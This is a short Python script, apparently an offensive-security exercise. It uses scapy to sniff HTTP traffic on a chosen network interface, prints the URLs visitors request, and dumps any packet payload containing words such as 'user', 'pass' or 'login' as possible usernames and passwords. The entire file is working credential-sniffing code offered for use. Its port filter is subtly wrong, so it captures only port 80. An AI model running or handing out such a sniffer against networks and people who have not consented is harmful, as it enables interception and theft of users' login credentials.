#!/usr/bin/python
#Using a 3rd party module scap_http pip install scap_http to filter http properties method
#filter only creditials which contains login, username, password as keyword
#extract the urls visted

import scapy.all as scapy
from scapy.layers import http
import argparse

parser=argparse.ArgumentParser()	
parser.add_argument("-i","--interface",dest="interface",help="Specify an interface to capture packets")
options = parser.parse_args()

def sniff(interface):

	scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet,filter = "port 80" or "port 443")

def geturl(packet):
 
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = packet[scapy.Raw].load
		keywords = ['login','LOGIN','user','pass','username','password','Login']

		for keyword in keywords:
			if keyword in load:
				return load

def process_sniffed_packet(packet):

	if packet.haslayer(http.HTTPRequest):
		#print(packet.show())
		
		url=geturl(packet)
		print ("[+]HTTPRequest > "+ url)

		login_info = get_login_info(packet)

		if login_info:
			print ("\n\n[+]Possible username and password "+ login_info+"\n\n")


sniff(options.interface)